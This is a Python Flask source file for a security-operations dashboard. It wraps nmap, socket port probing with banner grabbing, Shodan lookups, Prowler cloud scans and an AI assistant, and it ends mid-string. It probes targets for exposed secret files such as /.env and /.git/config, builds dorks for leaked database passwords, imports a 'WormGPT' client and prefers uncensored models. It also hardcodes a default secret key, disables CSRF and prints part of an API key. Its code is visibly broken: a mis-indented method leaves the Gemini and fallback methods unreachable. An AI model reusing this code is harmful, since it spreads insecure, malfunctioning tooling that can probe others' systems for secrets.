import os
import re
import json
import csv
import io
import uuid
import shutil
import logging
import subprocess
import ipaddress
import shlex
import random
import socket
import threading
import requests
import subprocess
import time
import tempfile
from datetime import datetime, timedelta
from functools import wraps
from wormgpt_client import WormGPTClient
from flask import Flask, render_template, request, redirect, url_for, session, flash
from dotenv import load_dotenv
import os

load_dotenv()          # reads .env from the current working dir
# Optional: print to double‑check that values are present
print("WORMGPT_API_KEY:", os.getenv("WORMGPT_API_KEY")[:4], "...")   # just a quick sanity check
import requests
from flask import (Flask, render_template, redirect, url_for, flash,
                   request, session, jsonify, Response)
from flask_sqlalchemy import SQLAlchemy
from flask_login import (LoginManager, UserMixin, login_user,
                         login_required, logout_user, current_user)
from flask_wtf import FlaskForm
from wtforms import (StringField, PasswordField, SelectField,
                     BooleanField, SubmitField)
from wtforms.validators import DataRequired, Length, ValidationError, Optional
from werkzeug.security import generate_password_hash, check_password_hash

from flask_wtf.csrf import CSRFProtect, CSRFError

# ══════════════════════════════════════════════════════════════
# 1. APP SETUP
# ══════════════════════════════════════════════════════════════
app = Flask(__name__)
app.config['SECRET_KEY']                  = os.environ.get('SECRET_KEY', 'secops-dev-key-2024')
app.config['SQLALCHEMY_DATABASE_URI']     = os.environ.get('DATABASE_URL', 'sqlite:///secops.db')
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
app.config['GEMINI_API_KEY']              = os.environ.get('GEMINI_API_KEY', '')
app.config['WTF_CSRF_CHECK_DEFAULT']      = False

db            = SQLAlchemy(app)
login_manager = LoginManager(app)
login_manager.login_view = 'login'

logging.basicConfig(filename='audit.log', level=logging.INFO,
                    format='%(asctime)s:%(levelname)s:%(message)s')


# ══════════════════════════════════════════════════════════════
# 2. SECURITY UTILS
# ══════════════════════════════════════════════════════════════
class SecurityUtils:
    @staticmethod
    def validate_target(target):
        if re.search(r'[;&|`$\\\'\"]', target):
            raise ValueError("Invalid characters in target.")
        # Accept URLs
        if target.startswith('http://') or target.startswith('https://'):
            return True, "URL"
        # Accept IP
        try:
            ipaddress.ip_address(target)
            return True, "IP"
        except ValueError:
            pass
        # Accept Domain
        if re.match(
            r'^(?:[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?\.)+[a-zA-Z]{2,6}$',
            target
        ):
            return True, "Domain"
        # Accept localhost
        if target in ['localhost', '127.0.0.1', '::1']:
            return True, "Localhost"
        raise ValueError("Invalid target. Must be a valid IP or Domain.")

# ══════════════════════════════════════════════════════════════
# 3. DATABASE MODELS
# ══════════════════════════════════════════════════════════════
class User(UserMixin, db.Model):
    id             = db.Column(db.Integer, primary_key=True)
    username       = db.Column(db.String(150), unique=True, nullable=False)
    password_hash  = db.Column(db.String(256), nullable=False)
    role           = db.Column(db.String(50), default='analyst')
    mode           = db.Column(db.String(20), default='individual')
    created_at     = db.Column(db.DateTime, default=datetime.utcnow)
    is_active_user = db.Column(db.Boolean, default=True)
    def set_password(self, p): self.password_hash = generate_password_hash(p)
    def check_password(self, p): return check_password_hash(self.password_hash, p)

class AuditLog(db.Model):
    id             = db.Column(db.Integer, primary_key=True)
    user_id        = db.Column(db.Integer, db.ForeignKey('user.id'), nullable=False)
    target         = db.Column(db.String(150), nullable=False)
    tool_used      = db.Column(db.String(80),  nullable=False)
    timestamp      = db.Column(db.DateTime, default=datetime.utcnow)
    status         = db.Column(db.String(50))
    output_summary = db.Column(db.Text)
    user           = db.relationship('User', backref=db.backref('logs', lazy=True))

class Vulnerability(db.Model):
    id             = db.Column(db.Integer, primary_key=True)
    cve_id         = db.Column(db.String(50), unique=True, nullable=False)
    description    = db.Column(db.Text, nullable=False)
    cvss_score     = db.Column(db.Float, default=0.0)
    severity       = db.Column(db.String(20))
    published_date = db.Column(db.DateTime)
    vendor_product = db.Column(db.String(200))
    is_kev         = db.Column(db.Boolean, default=False)
    @property
    def risk_level(self):
        if self.is_kev or self.cvss_score >= 9.0: return "Critical"
        if self.cvss_score >= 7.0: return "High"
        if self.cvss_score >= 4.0: return "Medium"
        return "Low"

class SIEMAlert(db.Model):
    id          = db.Column(db.Integer, primary_key=True)
    alert_id    = db.Column(db.String(50), unique=True, nullable=False)
    title       = db.Column(db.String(200), nullable=False)
    source      = db.Column(db.String(50))
    severity    = db.Column(db.String(20))
    status      = db.Column(db.String(20), default='Open')
    description = db.Column(db.Text)
    host        = db.Column(db.String(100))
    timestamp   = db.Column(db.DateTime, default=datetime.utcnow)

class Asset(db.Model):
    id          = db.Column(db.Integer, primary_key=True)
    hostname    = db.Column(db.String(100), nullable=False)
    ip_address  = db.Column(db.String(50))
    os_type     = db.Column(db.String(80))
    asset_type  = db.Column(db.String(50))
    criticality = db.Column(db.String(20))
    status      = db.Column(db.String(20), default='Online')
    last_seen   = db.Column(db.DateTime, default=datetime.utcnow)
    department  = db.Column(db.String(80))

class ServiceNowTicket(db.Model):
    id          = db.Column(db.Integer, primary_key=True)
    inc_number  = db.Column(db.String(20), unique=True, nullable=False)
    title       = db.Column(db.String(200), nullable=False)
    description = db.Column(db.Text)
    priority    = db.Column(db.String(20))
    status      = db.Column(db.String(20), default='New')
    source      = db.Column(db.String(50))
    created_at  = db.Column(db.DateTime, default=datetime.utcnow)
    assigned_to = db.Column(db.String(80), default='SOC Team')

class ProwlerScan(db.Model):
    id           = db.Column(db.Integer, primary_key=True)
    scan_id      = db.Column(db.String(50), unique=True, nullable=False)
    provider     = db.Column(db.String(20))
    status       = db.Column(db.String(20), default='pending')
    started_at   = db.Column(db.DateTime, default=datetime.utcnow)
    completed_at = db.Column(db.DateTime)
    findings_json= db.Column(db.Text)
    total_pass   = db.Column(db.Integer, default=0)
    total_fail   = db.Column(db.Integer, default=0)
    total_warn   = db.Column(db.Integer, default=0)

class ChatMessage(db.Model):
    id        = db.Column(db.Integer, primary_key=True)
    user_id   = db.Column(db.Integer, db.ForeignKey('user.id'), nullable=False)
    role      = db.Column(db.String(10))
    content   = db.Column(db.Text, nullable=False)
    mode      = db.Column(db.String(20))
    timestamp = db.Column(db.DateTime, default=datetime.utcnow)
    user      = db.relationship('User', backref=db.backref('chats', lazy=True))

class PentestJob(db.Model):
    id           = db.Column(db.Integer, primary_key=True)
    user_id      = db.Column(db.Integer, db.ForeignKey('user.id'), nullable=False)
    job_id       = db.Column(db.String(20), unique=True, nullable=False)
    category     = db.Column(db.String(50))
    tool         = db.Column(db.String(50))
    target       = db.Column(db.String(200))
    status       = db.Column(db.String(20), default='pending')
    output       = db.Column(db.Text)
    started_at   = db.Column(db.DateTime, default=datetime.utcnow)
    completed_at = db.Column(db.DateTime)
    user         = db.relationship('User', backref=db.backref('pentest_jobs', lazy=True))

@login_manager.user_loader
def load_user(uid): return User.query.get(int(uid))

# ══════════════════════════════════════════════════════════════
# 4. SCAN TOOL WRAPPERS
# ══════════════════════════════════════════════════════════════
class ToolWrapper:
    def _log(self, target, tool, output, user_id=None):
        """Log audit entry. Uses user_id param if current_user not available (threads)."""
        try:
            uid = user_id if user_id is not None else current_user.id
            db.session.add(AuditLog(
                user_id=uid, target=target, tool_used=tool,
                status="Success",
                output_summary=output[:500] + "..." if len(output) > 500 else output))
            db.session.commit()
            logging.info(f"USER:{uid}|TOOL:{tool}|TARGET:{target}")
        except Exception as e:
            logging.warning(f"Audit log error: {e}")
            db.session.rollback()

class NmapWrapper(ToolWrapper):
    def run(self, target, user_id=None):
        try:
            r = subprocess.run(['nmap', '-F', '-T4', target],
                               capture_output=True, text=True, timeout=30)
            out = r.stdout or r.stderr
        except FileNotFoundError:
            out = (f"[SIMULATION] Nmap Fast Scan → {target}\n\n"
                   f"PORT     STATE  SERVICE   VERSION\n"
                   f"22/tcp   open   ssh       OpenSSH 8.4p1\n"
                   f"80/tcp   open   http      Apache httpd 2.4.51\n"
                   f"443/tcp  open   https     nginx 1.21.0\n"
                   f"3306/tcp closed mysql\n"
                   f"8080/tcp open   http-alt  Tomcat 9.0.54\n\n"
                   f"Nmap done: 1 IP address scanned in 4.21 seconds")
        except Exception as e:
            out = str(e)
        self._log(target, "Nmap (Fast Scan)", out, user_id)
        return out

class WhoisWrapper(ToolWrapper):
    def run(self, target):
        import socket
        lines = [f"[RECON] Live DNS/WHOIS → {target}\n"]

        # Real DNS lookup
        try:
            ip = socket.gethostbyname(target)
            lines.append(f"[DNS Records] — LIVE DATA")
            lines.append(f"A     → {ip}")
        except Exception as e:
            lines.append(f"A     → Resolution failed: {e}")

        try:
            import dns.resolver
            for rtype in ['MX', 'TXT', 'NS']:
                try:
                    for r in dns.resolver.resolve(target, rtype, lifetime=5):
                        lines.append(f"{rtype:<6} → {r.to_text()}")
                except: pass
        except ImportError:
            lines.append(f"(Install dnspython for MX/TXT/NS: pip install dnspython)")

        lines.append(f"\n[WHOIS] — LIVE DATA")
        try:
            import whois
            w = whois.whois(target)
            lines.append(f"Registrar:    {w.registrar}")
            lines.append(f"Created:      {w.creation_date}")
            lines.append(f"Expiry:       {w.expiration_date}")
            lines.append(f"Name Servers: {', '.join(w.name_servers) if w.name_servers else 'N/A'}")
        except ImportError:
            lines.append(f"(Install python-whois: pip install python-whois)")
        except Exception as e:
            lines.append(f"WHOIS failed: {e}")

        out = "\n".join(lines)
        self._log(target, "Whois/DNS Recon", out)
        return out

class NiktoWrapper(ToolWrapper):
    def run(self, target):
        import requests as req
        import urllib3
        urllib3.disable_warnings()

        # Normalize target
        base = target if target.startswith('http') else f'http://{target}'
        lines = [f"[Web Scanner] Target: {target}\n"]

        # Check common paths for real results
        paths = [
            '/admin/', '/administrator/', '/login/', '/wp-login.php',
            '/phpmyadmin/', '/robots.txt', '/.git/config', '/config.php.bak',
            '/phpinfo.php', '/server-status', '/.env', '/backup/',
            '/wp-config.php.bak', '/xmlrpc.php', '/api/', '/dashboard/',
        ]

        lines.append("[PATH ENUMERATION — LIVE]")
        found = []
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'}

        for path in paths:
            try:
                r = req.get(f"{base}{path}", timeout=5,
                           verify=False, allow_redirects=False,
                           headers=headers)
                if r.status_code in [200, 301, 302, 403]:
                    status_label = {
                        200: "FOUND",
                        301: "REDIRECT",
                        302: "REDIRECT",
                        403: "FORBIDDEN (exists)"
                    }.get(r.status_code, str(r.status_code))
                    found.append(f"  [{r.status_code}] {base}{path} — {status_label}")
            except Exception:
                pass

        if found:
            lines.extend(found)
        else:
            lines.append(f"  No common paths found on {target}")

        # Real header check
        lines.append("\n[SECURITY HEADERS — LIVE]")
        try:
            r = req.get(base, timeout=8, verify=False, headers=headers)
            server = r.headers.get('Server', 'Not disclosed')
            lines.append(f"  Server: {server}")
            lines.append(f"  Status: {r.status_code}")

            security_headers = [
                'X-Frame-Options',
                'X-Content-Type-Options',
                'Strict-Transport-Security',
                'Content-Security-Policy',
                'X-XSS-Protection',
                'Referrer-Policy',
            ]
            for h in security_headers:
                val = r.headers.get(h)
                if val:
                    lines.append(f"  ✓ {h}: {val}")
                else:
                    lines.append(f"  ✗ {h}: MISSING")

            # Check cookies
            for cookie in r.cookies:
                flags = []
                if not cookie.has_nonstandard_attr('HttpOnly'):
                    flags.append("NO HttpOnly")
                if not cookie.secure:
                    flags.append("NO Secure flag")
                if flags:
                    lines.append(f"  ⚠ Cookie '{cookie.name}': {', '.join(flags)}")

        except Exception as e:
            lines.append(f"  Could not connect to {target}: {e}")

        out = "\n".join(lines)
        self._log(target, "Web Scanner (Nikto-style)", out)
        return out

class OpenVASWrapper(ToolWrapper):
    def run(self, target, user_id=None):
        out = (f"[SIMULATION] OpenVAS Assessment → {target}\n\n"
               f"[CRITICAL] SMBv1 Enabled (CVE-2017-0144) CVSS 9.8\n"
               f"[HIGH]     OpenSSH <8.5 Privilege Escalation CVSS 7.8\n"
               f"[HIGH]     Apache mod_status Info Disclosure CVSS 7.5\n"
               f"[MEDIUM]   Weak SSL/TLS Ciphers CVSS 5.9\n"
               f"[LOW]      Default Credentials Possible CVSS 3.1\n\nSummary: 1C 2H 1M 1L")
        self._log(target, "OpenVAS Assessment", out, user_id)
        return out

class ShodanWrapper(ToolWrapper):
    def run(self, target):
        import socket
        lines = [f"[Shodan Intelligence] Target: {target}\n"]

        # Try real Shodan API first
        shodan_key = os.environ.get('SHODAN_API_KEY', '')
        if shodan_key:
            try:
                import requests as req
                # Resolve domain to IP first
                try:
                    ip = socket.gethostbyname(target)
                except:
                    ip = target

                r = req.get(
                    f"https://api.shodan.io/shodan/host/{ip}?key={shodan_key}",
                    timeout=10
                )
                if r.status_code == 200:
                    data = r.json()
                    lines.append(f"[SHODAN LIVE DATA — {ip}]")
                    lines.append(f"  IP:           {data.get('ip_str', ip)}")
                    lines.append(f"  Org:          {data.get('org', 'N/A')}")
                    lines.append(f"  ISP:          {data.get('isp', 'N/A')}")
                    lines.append(f"  Country:      {data.get('country_name', 'N/A')}")
                    lines.append(f"  City:         {data.get('city', 'N/A')}")
                    lines.append(f"  OS:           {data.get('os', 'Unknown')}")
                    lines.append(f"  Last Update:  {data.get('last_update', 'N/A')}")
                    lines.append(f"  Hostnames:    {', '.join(data.get('hostnames', []))}")
                    lines.append(f"  Domains:      {', '.join(data.get('domains', []))}")
                    lines.append(f"  Tags:         {', '.join(data.get('tags', []))}")

                    lines.append(f"\n[OPEN PORTS & BANNERS — LIVE]")
                    for svc in data.get('data', []):
                        port = svc.get('port')
                        transport = svc.get('transport', 'tcp')
                        product = svc.get('product', '')
                        version = svc.get('version', '')
                        banner = svc.get('data', '')[:80].replace('\n', ' ')
                        lines.append(f"  {port}/{transport}  {product} {version}")
                        if banner:
                            lines.append(f"    Banner: {banner}")

                    vulns = data.get('vulns', [])
                    if vulns:
                        lines.append(f"\n[VULNERABILITIES INDEXED BY SHODAN — LIVE]")
                        for cve in vulns:
                            lines.append(f"  {cve}")
                    else:
                        lines.append(f"\n[VULNERABILITIES] None indexed by Shodan")

                    out = "\n".join(lines)
                    self._log(target, "Shodan Intelligence (LIVE)", out)
                    return out
                else:
                    lines.append(f"Shodan API error: {r.status_code} — {r.text[:100]}")
            except ImportError:
                lines.append("pip install shodan for full API integration")
            except Exception as e:
                lines.append(f"Shodan API failed: {e}")

        # Fallback — real socket-based scan
        lines.append(f"[No SHODAN_API_KEY set — running real socket probe]\n")
        lines.append(f"[DNS RESOLUTION — LIVE]")
        try:
            ip = socket.gethostbyname(target)
            lines.append(f"  {target} → {ip}")
        except Exception as e:
            ip = target
            lines.append(f"  Could not resolve {target}: {e}")

        lines.append(f"\n[PORT PROBE — LIVE]")
        common_ports = {
            21: 'FTP', 22: 'SSH', 23: 'Telnet', 25: 'SMTP',
            53: 'DNS', 80: 'HTTP', 110: 'POP3', 143: 'IMAP',
            443: 'HTTPS', 445: 'SMB', 3306: 'MySQL',
            3389: 'RDP', 5432: 'PostgreSQL', 6379: 'Redis',
            8080: 'HTTP-Alt', 8443: 'HTTPS-Alt', 27017: 'MongoDB'
        }
        open_ports = []
        for port, service in common_ports.items():
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((ip, port))
                sock.close()
                if result == 0:
                    # Try banner grab
                    banner = ''
                    try:
                        s2 = socket.socket()
                        s2.settimeout(2)
                        s2.connect((ip, port))
                        if port in [80, 8080]:
                            s2.send(b'HEAD / HTTP/1.0\r\nHost: ' + target.encode() + b'\r\n\r\n')
                        banner = s2.recv(256).decode('utf-8', errors='ignore').split('\n')[0].strip()
                        s2.close()
                    except:
                        pass
                    open_ports.append(f"  {port}/{service:<12} OPEN  {banner[:60]}")
            except:
                pass

        if open_ports:
            lines.extend(open_ports)
        else:
            lines.append(f"  No common ports open on {ip} (firewall may be blocking)")

        lines.append(f"\n[NOTE] Set SHODAN_API_KEY in .env for full Shodan data")
        lines.append(f"  Get free key: https://account.shodan.io/register")

        out = "\n".join(lines)
        self._log(target, "Shodan Intelligence", out)
        return out

class HarvesterWrapper(ToolWrapper):
    def run(self, target, user_id=None):
        out = (f"[SIMULATION] theHarvester OSINT → {target}\n\n"
               f"[EMAILS]\nadmin@{target}\nsecurity@{target}\ndevops@{target}\n\n"
               f"[SUBDOMAINS]\nmail.{target} → 93.184.216.10\nvpn.{target} → 93.184.216.11\n"
               f"dev.{target} → 93.184.216.12 (!! exposed)\napi.{target} → 93.184.216.13\n\n"
               f"Total: 3 emails, 4 subdomains")
        self._log(target, "theHarvester OSINT", out, user_id)
        return out

class ReconNGWrapper(ToolWrapper):
    def run(self, target, user_id=None):
        out = (f"[SIMULATION] Recon-ng → {target}\n\n"
               f"[*] bing_domain_web: {target} → 93.184.216.34\n"
               f"[*] pgp_search: admin@{target}, devops@{target}\n"
               f"[*] xssed: XSS found on /search?q= parameter\n\n3 modules, 5 findings")
        self._log(target, "Recon-ng Framework", out, user_id)
        return out

class GoogleDorkWrapper(ToolWrapper):
    def run(self, target, user_id=None):
        out = (f"[*] Google Dorks for {target}\n\n"
               f"[SENSITIVE FILES]\nsite:{target} ext:pdf OR ext:sql OR ext:env\n"
               f"[ADMIN PANELS]\nsite:{target} inurl:admin OR inurl:login\n"
               f"[CONFIG LEAKS]\nsite:{target} intext:\"DB_PASSWORD\" OR intext:\"mysql_connect\"\n"
               f"[ERRORS]\nsite:{target} intext:\"Fatal error\" OR intext:\"Warning: mysqli\"")
        self._log(target, "Google Dorks", out, user_id)
        return out

# ══════════════════════════════════════════════════════════════
# 5. PROWLER SERVICE
# ══════════════════════════════════════════════════════════════
PROWLER_MOCK_FINDINGS = [
    {"check_id":"iam_root_hardware_mfa_enabled","service":"IAM","severity":"critical","status":"FAIL","region":"global","resource":"root","description":"Root account does not have hardware MFA enabled","remediation":"Enable hardware MFA for root account","compliance":["CIS 1.6","NIST AC-2","PCI-DSS 8.3"]},
    {"check_id":"s3_bucket_public_access","service":"S3","severity":"critical","status":"FAIL","region":"us-east-1","resource":"s3://prod-data-bucket","description":"S3 bucket has public access enabled","remediation":"Block all public access via S3 Block Public Access settings","compliance":["CIS 2.1.5","NIST SC-7","PCI-DSS 1.3"]},
    {"check_id":"ec2_instance_imdsv2_enabled","service":"EC2","severity":"high","status":"FAIL","region":"us-east-1","resource":"i-0abc123def456","description":"Instance Metadata Service v2 not enforced","remediation":"Set HttpTokens to required for IMDSv2","compliance":["CIS 5.6","NIST SI-2"]},
    {"check_id":"cloudtrail_enabled","service":"CloudTrail","severity":"critical","status":"FAIL","region":"us-east-1","resource":"trail/prod","description":"CloudTrail is not enabled in all regions","remediation":"Enable CloudTrail with multi-region logging","compliance":["CIS 3.1","NIST AU-2","SOC2 CC7.2"]},
    {"check_id":"guardduty_enabled","service":"GuardDuty","severity":"high","status":"FAIL","region":"us-west-2","resource":"detector","description":"GuardDuty is not enabled in us-west-2","remediation":"Enable GuardDuty in all regions","compliance":["CIS 3.11","NIST SI-4"]},
    {"check_id":"iam_password_policy_uppercase","service":"IAM","severity":"medium","status":"FAIL","region":"global","resource":"password-policy","description":"IAM password policy does not require uppercase letters","remediation":"Update IAM password policy to require uppercase","compliance":["CIS 1.8","NIST IA-5"]},
    {"check_id":"vpc_flow_logs_enabled","service":"VPC","severity":"medium","status":"FAIL","region":"us-east-1","resource":"vpc-0abc123","description":"VPC Flow Logs not enabled","remediation":"Enable VPC Flow Logs and send to CloudWatch","compliance":["CIS 3.9","NIST AU-12"]},
    {"check_id":"rds_instance_deletion_protection","service":"RDS","severity":"medium","status":"FAIL","region":"us-east-1","resource":"db-prod-01","description":"RDS instance deletion protection not enabled","remediation":"Enable deletion protection on RDS instances","compliance":["NIST CP-9","SOC2 A1.2"]},
    {"check_id":"s3_bucket_versioning_enabled","service":"S3","severity":"low","status":"FAIL","region":"us-east-1","resource":"s3://backup-bucket","description":"S3 bucket versioning not enabled","remediation":"Enable versioning on S3 buckets","compliance":["NIST CP-10","SOC2 A1.2"]},
    {"check_id":"iam_user_mfa_enabled","service":"IAM","severity":"critical","status":"FAIL","region":"global","resource":"iam-user/deploy-bot","description":"IAM user deploy-bot does not have MFA enabled","remediation":"Enable MFA for all IAM users with console access","compliance":["CIS 1.10","NIST IA-2","PCI-DSS 8.3"]},
    {"check_id":"ec2_security_group_unrestricted_ssh","service":"EC2","severity":"critical","status":"FAIL","region":"us-east-1","resource":"sg-0abc123","description":"Security group allows unrestricted SSH (0.0.0.0/0)","remediation":"Restrict SSH to known IP ranges only","compliance":["CIS 5.2","NIST SC-7","PCI-DSS 1.2"]},
    {"check_id":"kms_cmk_rotation_enabled","service":"KMS","severity":"low","status":"PASS","region":"us-east-1","resource":"key/prod-key","description":"KMS CMK automatic rotation is enabled","remediation":"No action required","compliance":["CIS 3.8","NIST SC-28"]},
    {"check_id":"cloudwatch_alarm_unauthorized_api","service":"CloudWatch","severity":"medium","status":"PASS","region":"us-east-1","resource":"alarm/unauthorized-api-calls","description":"CloudWatch alarm for unauthorized API calls exists","remediation":"No action required","compliance":["CIS 4.1","NIST AU-6"]},
    {"check_id":"iam_support_role","service":"IAM","severity":"low","status":"PASS","region":"global","resource":"role/AWSSupportAccess","description":"IAM role for AWS Support access exists","remediation":"No action required","compliance":["CIS 1.17"]},
    {"check_id":"config_enabled","service":"Config","severity":"high","status":"WARN","region":"eu-west-1","resource":"config-recorder","description":"AWS Config is not enabled in eu-west-1","remediation":"Enable AWS Config in all regions","compliance":["CIS 3.5","NIST CM-8"]},
]

COMPLIANCE_FRAMEWORKS = {
    "CIS":      {"total":38, "pass":21, "fail":13, "warn":4},
    "NIST 800": {"total":45, "pass":28, "fail":14, "warn":3},
    "PCI-DSS":  {"total":22, "pass":14, "fail":7,  "warn":1},
    "SOC2":     {"total":18, "pass":12, "fail":5,  "warn":1},
    "ISO 27001":{"total":30, "pass":20, "fail":8,  "warn":2},
    "GDPR":     {"total":15, "pass":10, "fail":4,  "warn":1},
}

class ProwlerService:
    @staticmethod
    def run_scan(scan_id, provider, credentials=None):
        scan = ProwlerScan.query.filter_by(scan_id=scan_id).first()
        if not scan: return

        real_output = ProwlerService._try_real_prowler(provider, credentials)

        if real_output:
            findings = real_output
        else:
            import time; time.sleep(3)
            findings = PROWLER_MOCK_FINDINGS.copy()
            random.shuffle(findings)

        pass_c = sum(1 for f in findings if f['status'] == 'PASS')
        fail_c = sum(1 for f in findings if f['status'] == 'FAIL')
        warn_c = sum(1 for f in findings if f['status'] == 'WARN')

        scan.status        = 'completed'
        scan.completed_at  = datetime.utcnow()
        scan.findings_json = json.dumps(findings)
        scan.total_pass    = pass_c
        scan.total_fail    = fail_c
        scan.total_warn    = warn_c
        db.session.commit()

        critical = [f for f in findings if f['severity'] == 'critical' and f['status'] == 'FAIL']
        for f in critical[:3]:
            inc = f"INC{random.randint(1000000, 9999999)}"
            if not ServiceNowTicket.query.filter_by(inc_number=inc).first():
                db.session.add(ServiceNowTicket(
                    inc_number=inc,
                    title=f"[Prowler] {f['check_id']}",
                    description=f"{f['description']}\n\nRemediation: {f['remediation']}\nCompliance: {', '.join(f.get('compliance', []))}",
                    priority="Critical",
                    source="Prowler",
                    status="New"
                ))
        db.session.commit()

    @staticmethod
    def _try_real_prowler(provider, credentials):
        try:
            cmd = ['prowler', provider, '--output-formats', 'json',
                   '--output-filename', f'/tmp/prowler_out', '-M', 'json']
            env = os.environ.copy()
            if credentials:
                if provider == 'aws':
                    env['AWS_ACCESS_KEY_ID']    = credentials.get('access_key', '')
                    env['AWS_SECRET_ACCESS_KEY'] = credentials.get('secret_key', '')
                    env['AWS_DEFAULT_REGION']    = credentials.get('region', 'us-east-1')
                elif provider == 'azure':
                    env['AZURE_CLIENT_ID']     = credentials.get('client_id', '')
                    env['AZURE_CLIENT_SECRET'] = credentials.get('client_secret', '')
                    env['AZURE_TENANT_ID']     = credentials.get('tenant_id', '')

            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300, env=env)
            out_file = '/tmp/prowler_out.json'
            if os.path.exists(out_file):
                with open(out_file) as f:
                    raw = json.load(f)
                findings = []
                for item in raw:
                    findings.append({
                        'check_id':    item.get('CheckID', ''),
                        'service':     item.get('ServiceName', ''),
                        'severity':    item.get('Severity', '').lower(),
                        'status':      item.get('Status', ''),
                        'region':      item.get('Region', ''),
                        'resource':    item.get('ResourceId', ''),
                        'description': item.get('Description', ''),
                        'remediation': item.get('Remediation', {}).get('Recommendation', {}).get('Text', ''),
                        'compliance':  [],
                    })
                return findings if findings else None
        except Exception as e:
            logging.warning(f"Real Prowler failed: {e}")
        return None

    @staticmethod
    def get_threat_score(findings):
        weights = {'critical': 10, 'high': 7, 'medium': 4, 'low': 1}
        score = 0
        fails = [f for f in findings if f['status'] == 'FAIL']
        for f in fails:
            score += weights.get(f['severity'], 1)
        max_score = len(findings) * 10
        if max_score == 0: return 0
        return round((score / max_score) * 100, 1)



OLLAMA_URL = "http://localhost:11434/api/chat"
OLLAMA_TAGS_URL = "http://localhost:11434/api/tags"

# Preferred models in order
PREFERRED_MODELS = [
    'dolphin-llama3:8b',
    'dolphin-llama3',
    'llama3',
    'mistral',
    'gemma2',
    'llama2',
    'gemma'
]

INDIVIDUAL_PROMPT = """You are an AI Red Team Assistant for ethical hackers.
Respond ONLY using this plain text structure (no markdown):
[Recon Results]
- Open Ports: (list)
- Detected Services: (list)
[Simulated Offensive Path]
- SIMULATION: (discovery)
- SIMULATION: (attempt)
[Risk Level]
(Low/Medium/High + reason)
[Educational Recommendation]
- (what to secure next)"""

ORGANIZATION_PROMPT = """You are an Enterprise SOC AI Orchestration Layer.
Respond ONLY using this plain text structure (no markdown):
[Alert Summary]
- (correlated alert findings)
[Related Vulnerabilities]
- (CVE IDs, CVSS, KEV status)
[Business Impact]
- (risk based on asset criticality)
[Recommended Action]
- (remediation / containment steps)
[Patch Availability]
- (vulnerable versions and fixes)
Professional SOC tone. Act as if querying live SIEM/EDR/Vuln databases."""

PROWLER_PROMPT = """You are a Cloud Security Expert specializing in Prowler findings.
When given Prowler scan results, analyze them and respond using:
[Executive Summary]
- (overall cloud security posture)
[Critical Findings]
- (list critical FAILs with CVE/check ID)
[Compliance Impact]
- (which frameworks are affected: CIS, NIST, PCI-DSS etc.)
[Remediation Priority]
- (ordered list of what to fix first with steps)
[ThreatScore Analysis]
- (explain the risk score and what drives it)
Professional cloud security tone."""


def start_ollama():
    """Start Ollama if not already running."""
    try:
        requests.get("http://localhost:11434", timeout=3)
        print("✅ Ollama already running")
    except Exception:
        try:
            subprocess.Popen(
                ["ollama", "serve"],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            time.sleep(3)
            print("✅ Ollama started")
        except FileNotFoundError:
            print("⚠️  Ollama not installed — AI will use Gemini or fallback")


PREFERRED_MODELS = [
    'dolphin-llama3:8b',
    'dolphin-llama3',
    'llama3',
    'mistral',
    'gemma2',
    'llama2',
]

def get_available_model():
    try:
        r = requests.get(
            "http://localhost:11434/api/tags",
            timeout=5
        )
        data = r.json()
        models = [m['name'] for m in data.get('models', [])]
        print(f"[Ollama] Installed models: {models}")
        
        # Direct match first
        for preferred in PREFERRED_MODELS:
            if preferred in models:
                print(f"[Ollama] Using: {preferred}")
                return preferred
        
        # Partial match
        for preferred in PREFERRED_MODELS:
            for installed in models:
                if preferred.split(':')[0] in installed:
                    print(f"[Ollama] Using (partial): {installed}")
                    return installed
        
        # Use first available
        if models:
            print(f"[Ollama] Using first available: {models[0]}")
            return models[0]
            
    except Exception as e:
        print(f"[Ollama] Error: {e}")
    return None


class AIService:

    @staticmethod
    def get_system_prompt(mode):
        sys_map = {
            'individual':   INDIVIDUAL_PROMPT,
            'organization': ORGANIZATION_PROMPT,
            'prowler':      PROWLER_PROMPT,
        }
        return sys_map.get(mode, ORGANIZATION_PROMPT)

    @staticmethod
    def get_response(prompt, mode):
        # Try Ollama first
        try:
            response = AIService._ollama(prompt, mode)
            if response:
                return response
        except Exception as e:
            logging.warning(f"Ollama failed: {e}")

        # Fallback to Gemini
        key = app.config.get('GEMINI_API_KEY', '')
        if key:
            try:
                return AIService._gemini(prompt, mode, key)
            except Exception as e:
                logging.warning(f"Gemini failed: {e}")

        # Final fallback
        return AIService._fallback(mode)

@staticmethod
def _ollama(prompt, mode):
    model = get_available_model()
    print(f"[Ollama] Model selected: {model}")
    
    if not model:
        print("[Ollama] No model found!")
        return None

    messages = [
        {"role": "system", "content": AIService.get_system_prompt(mode)},
        {"role": "user",   "content": prompt}
    ]

    print(f"[Ollama] Sending request to {OLLAMA_URL}")
    r = requests.post(
        OLLAMA_URL,
        json={
            "model":    model,
            "messages": messages,
            "stream":   False,
            "options": {
                "temperature": 0.7,
                "num_predict": 1024,
            }
        },
        timeout=120
    )
    print(f"[Ollama] Response status: {r.status_code}")
    r.raise_for_status()
    content = r.json().get("message", {}).get("content", "").strip()
    print(f"[Ollama] Got response: {content[:100]}...")
    return content or None

    @staticmethod
    def _gemini(prompt, mode, key):
        url = (
            f"https://generativelanguage.googleapis.com/v1beta/"
            f"models/gemini-2.0-flash:generateContent?key={key}"
        )
        payload = {
            "contents": [{"parts": [{"text": prompt}]}],
            "systemInstruction": {
                "parts": [{"text": AIService.get_system_prompt(mode)}]
            }
        }
        r = requests.post(url, json=payload, timeout=30)
        r.raise_for_status()
        return r.json()['candidates'][0]['content']['parts'][0]['text']

    @staticmethod
    def _fallback(mode):
        if mode == 'prowler':
            return (
                "[Executive Summary]\n"
                "- Cloud security posture is HIGH RISK\n"
                "- Root account lacks hardware MFA\n\n"
                "[Critical Findings]\n"
                "- iam_root_hardware_mfa_enabled: Root MFA not enforced\n"
                "- s3_bucket_public_access: prod-data-bucket public\n\n"
                "[Compliance Impact]\n"
                "- CIS: 13 controls failing\n"
                "- PCI-DSS: 7 controls failing\n\n"
                "[Remediation Priority]\n"
                "- 1. Enable hardware MFA on root\n"
